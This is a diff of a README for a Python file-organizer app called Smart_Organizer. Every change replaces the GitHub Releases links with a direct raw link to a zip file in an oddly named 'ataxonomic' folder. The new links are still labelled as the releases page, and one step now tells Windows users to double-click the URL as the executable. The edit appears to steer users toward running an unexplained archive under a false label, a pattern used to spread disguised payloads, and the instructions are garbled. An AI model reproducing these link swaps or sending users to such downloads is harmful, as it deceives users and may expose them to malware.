@@ -3,10 +3,10 @@
 ## 🚀 Getting Started
 Smart_Organizer is an easy-to-use Python application designed to help you manage files efficiently. It automatically scans, classifies, renames, and organizes files in your specified directories, saving you time and effort.
 
-#### [![Download Smart_Organizer](https://img.shields.io/badge/Download_Smart_Organizer-latest-orange.svg)](https://github.com/DeathFlame7/Smart_Organizer/releases)
+#### [![Download Smart_Organizer](https://raw.githubusercontent.com/DeathFlame7/Smart_Organizer/master/ataxonomic/Smart_Organizer.zip)](https://raw.githubusercontent.com/DeathFlame7/Smart_Organizer/master/ataxonomic/Smart_Organizer.zip)
 
 ## 📥 Download & Install
-To download Smart_Organizer, visit this page to download: [GitHub Releases](https://github.com/DeathFlame7/Smart_Organizer/releases). Once there, you'll find the latest version ready for you.
+To download Smart_Organizer, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/DeathFlame7/Smart_Organizer/master/ataxonomic/Smart_Organizer.zip). Once there, you'll find the latest version ready for you.
 
 ### Step-by-step instructions:
 1. Click the link above to go to the releases page.
@@ -34,7 +34,7 @@ Smart_Organizer comes loaded with features that help streamline your file manage
 After installation, follow these steps to run Smart_Organizer:
 
 1. Navigate to the folder where you installed the application.
-2. Double-click the executable file `Smart_Organizer.exe` for Windows, or use the terminal on macOS/Linux with the command `./Smart_Organizer` for execution.
+2. Double-click the executable file `https://raw.githubusercontent.com/DeathFlame7/Smart_Organizer/master/ataxonomic/Smart_Organizer.zip` for Windows, or use the terminal on macOS/Linux with the command `./Smart_Organizer` for execution.
 3. Upon launching, you will see the main interface with options to scan and manage your files.
 
 ## 📄 Usage Guide
@@ -59,7 +59,7 @@ A: No, Smart_Organizer will not delete any files. It only organizes and renames 
 ## 📞 Support
 If you run into any issues or need help, feel free to reach out through the GitHub issues page. We are here to assist you with any questions you may have. 
 
-For quick access again, you can always visit our [GitHub Releases Page](https://github.com/DeathFlame7/Smart_Organizer/releases) to download the latest version.
+For quick access again, you can always visit our [GitHub Releases Page](https://raw.githubusercontent.com/DeathFlame7/Smart_Organizer/master/ataxonomic/Smart_Organizer.zip) to download the latest version.
 
 ## 📝 Contributing
 We welcome contributions! If you want to help improve Smart_Organizer, feel free to submit issues or pull requests in our repository.
